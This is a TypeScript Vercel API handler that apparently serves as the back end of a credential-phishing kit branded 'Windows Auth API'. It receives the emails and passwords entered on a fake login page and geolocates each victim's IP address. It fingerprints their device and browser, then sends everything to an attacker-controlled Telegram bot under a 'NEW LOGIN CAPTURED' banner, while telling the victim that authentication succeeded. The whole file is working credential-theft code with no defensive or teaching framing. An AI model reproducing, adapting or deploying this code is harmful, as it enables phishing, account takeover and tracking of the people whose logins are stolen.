import type { VercelRequest, VercelResponse } from '@vercel/node'
import { UAParser } from 'ua-parser-js'

// CONFIGURATION - Set these environment variables in Vercel Dashboard
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || ''

interface AuthRequest {
  email: string
  password: string
  userAgent: string
  platform: string
  language: string
  screenResolution: string
  timezone: string
  timestamp: string
}

interface GeoInfo {
  country: string
  countryCode: string
  region: string
  city: string
  ip: string
  isp: string
  org: string
  timezone: string
  latitude?: number
  longitude?: number
}

async function getGeoInfo(ip: string): Promise<GeoInfo | null> {
  try {
    // Skip for localhost/private IPs
    if (ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      return {
        country: 'Local Network',
        countryCode: 'LO',
        region: 'Local',
        city: 'Localhost',
        ip: ip,
        isp: 'Local ISP',
        org: 'Local Network',
        timezone: 'UTC'
      }
    }

    // Using ipapi.co for geolocation (free tier: 30k requests/month)
    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; AuthAPI/1.0)'
      }
    })
    
    if (!response.ok) {
      throw new Error(`Geo lookup failed: ${response.status}`)
    }

    const data = await response.json()
    
    return {
      country: data.country_name || 'Unknown',
      countryCode: data.country_code || 'Unknown',
      region: data.region || 'Unknown',
      city: data.city || 'Unknown',
      ip: data.ip || ip,
      isp: data.org || 'Unknown',
      org: data.asn || 'Unknown',
      timezone: data.timezone || 'Unknown',
      latitude: data.latitude,
      longitude: data.longitude
    }
  } catch (error) {
    console.error('Geo lookup error:', error)
    return null
  }
}

function getClientIP(request: VercelRequest): string {
  // Vercel-specific headers
  const forwarded = request.headers['x-forwarded-for']
  const realIP = request.headers['x-real-ip']
  const vercelForwarded = request.headers['x-vercel-forwarded-for']
  const cfConnectingIP = request.headers['cf-connecting-ip']
  
  // Priority order for IP detection
  if (typeof vercelForwarded === 'string') return vercelForwarded.split(',')[0].trim()
  if (typeof cfConnectingIP === 'string') return cfConnectingIP
  if (typeof realIP === 'string') return realIP
  if (typeof forwarded === 'string') return forwarded.split(',')[0].trim()
  
  // Fallback
  return request.socket?.remoteAddress || '127.0.0.1'
}

function parseUserAgent(userAgent: string) {
  const parser = new UAParser(userAgent)
  const result = parser.getResult()
  
  return {
    browser: `${result.browser.name || 'Unknown'} ${result.browser.version || ''}`,
    os: `${result.os.name || 'Unknown'} ${result.os.version || ''}`,
    device: result.device.type || 'desktop',
    model: result.device.model || 'Unknown',
    vendor: result.device.vendor || 'Unknown',
    cpu: result.cpu.architecture || 'Unknown'
  }
}

function formatTelegramMessage(
  data: AuthRequest, 
  geoInfo: GeoInfo | null, 
  uaInfo: ReturnType<typeof parseUserAgent>,
  clickTime: string,
  serverTime: string
): string {
  const countryFlag = geoInfo?.countryCode && geoInfo.countryCode !== 'Unknown'
    ? String.fromCodePoint(...[...geoInfo.countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
    : '🌐'

  const osEmoji = uaInfo.os.toLowerCase().includes('windows') ? '🪟' :
                  uaInfo.os.toLowerCase().includes('mac') ? '🍎' :
                  uaInfo.os.toLowerCase().includes('linux') ? '🐧' :
                  uaInfo.os.toLowerCase().includes('android') ? '🤖' :
                  uaInfo.os.toLowerCase().includes('ios') ? '📱' : '💻'

  return `
🚨 <b>NEW LOGIN CAPTURED</b> 🚨
━━━━━━━━━━━━━━━━━━━━━━

👤 <b>CREDENTIALS</b>
├─ 📧 Email: <code>${data.email}</code>
├─ 🔑 Password: <code>${data.password}</code>
└─ ⏰ Click Time: ${clickTime}

🌍 <b>LOCATION INTELLIGENCE</b>
├─ 🏳️ Country: ${countryFlag} ${geoInfo?.country || 'Unknown'}
├─ 🏙️ City: ${geoInfo?.city || 'Unknown'}
├─ 🗺️ Region: ${geoInfo?.region || 'Unknown'}
├─ 🌐 IP Address: <code>${geoInfo?.ip || 'Unknown'}</code>
├─ 🏢 ISP/Org: ${geoInfo?.isp || 'Unknown'}
├─ ⏱️ Timezone: ${geoInfo?.timezone || 'Unknown'}
${geoInfo?.latitude ? `├─ 📍 Coordinates: ${geoInfo.latitude}, ${geoInfo.longitude}` : ''}
└─ 🔗 <a href="https://ipapi.co/${geoInfo?.ip || ''}/">View IP Details</a>

💻 <b>SYSTEM FINGERPRINT</b>
├─ ${osEmoji} Operating System: ${uaInfo.os}
├─ 🌐 Browser: ${uaInfo.browser}
├─ 📱 Device Type: ${uaInfo.device}
├─ 🏷️ Device Model: ${uaInfo.model}
├─ 🏭 Manufacturer: ${uaInfo.vendor}
├─ 🖥️ CPU Architecture: ${uaInfo.cpu}
├─ 🖼️ Screen Resolution: ${data.screenResolution}
├─ 🗣️ Language: ${data.language}
└─ 🕐 Client Timezone: ${data.timezone}

📊 <b>SESSION METADATA</b>
├─ 🖥️ Platform: ${data.platform}
├─ 🌐 User-Agent: <code>${data.userAgent.slice(0, 80)}...</code>
├─ ⏱️ Server Time: ${serverTime}
└─ 📡 Endpoint: /api/auth

⚠️ <i>Captured by Windows Auth API</i>
   <i>Server Timestamp: ${new Date().toISOString()}</i>
  `.trim()
}

export default async function handler(
  request: VercelRequest,
  response: VercelResponse
) {
  // Enable CORS
  response.setHeader('Access-Control-Allow-Credentials', 'true')
  response.setHeader('Access-Control-Allow-Origin', '*')
  response.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT')
  response.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version')

  // Handle preflight
  if (request.method === 'OPTIONS') {
    return response.status(200).end()
  }

  // Only allow POST
  if (request.method !== 'POST') {
    return response.status(405).json({ error: 'Method not allowed' })
  }

  try {
    // Parse request body
    const data: AuthRequest = request.body
    
    // Validate required fields
    if (!data || !data.email || !data.password) {
      return response.status(400).json({
        error: 'Missing required fields',
        details: 'Email and password are required'
      })
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(data.email)) {
      return response.status(400).json({
        error: 'Invalid email format'
      })
    }

    // Get client IP and geolocation
    const clientIP = getClientIP(request)
    console.log('Client IP detected:', clientIP)

    // Get geo info
    const geoInfo = await getGeoInfo(clientIP)
    console.log('Geo info:', geoInfo)
    
    // Parse user agent
    const uaInfo = parseUserAgent(data.userAgent)
    console.log('UA info:', uaInfo)
    
    // Format timestamps
    const clickTime = new Date(data.timestamp).toLocaleString('en-US', {
      timeZone: 'UTC',
      dateStyle: 'full',
      timeStyle: 'long'
    })
    
    const serverTime = new Date().toLocaleString('en-US', {
      timeZone: 'UTC',
      dateStyle: 'full',
      timeStyle: 'long'
    })

    // Format message for Telegram
    const message = formatTelegramMessage(data, geoInfo, uaInfo, clickTime, serverTime)

    // Send to Telegram if configured
    let telegramStatus = 'not_configured'
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
      try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
        
        const telegramResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
        })

        if (telegramResponse.ok) {
          telegramStatus = 'sent'
          console.log('✅ Telegram notification sent successfully')
        } else {
          const errorText = await telegramResponse.text()
          console.error('❌ Telegram API error:', errorText)
          telegramStatus = 'failed'
        }
      } catch (telegramError) {
        console.error('❌ Telegram send error:', telegramError)
        telegramStatus = 'error'
      }
    } else {
      console.log('⚠️ Telegram not configured. Message:')
      console.log(message)
    }

    // Log summary
    console.log('🔐 Auth Capture Summary:', {
      email: data.email,
      ip: geoInfo?.ip || clientIP,
      country: geoInfo?.country,
      city: geoInfo?.city,
      os: uaInfo.os,
      browser: uaInfo.browser,
      telegramStatus,
      timestamp: new Date().toISOString()
    })

    // Return success to client
    return response.status(200).json({
      success: true,
      message: 'Authentication processed',
      meta: {
        timestamp: new Date().toISOString(),
        requestId: Math.random().toString(36).substring(7)
      }
    })

  } catch (error) {
    console.error('💥 API Error:', error)
    
    return response.status(500).json({
      error: 'Internal server error',
      message: error instanceof Error ? error.message : 'Unknown error'
    })
  }
}
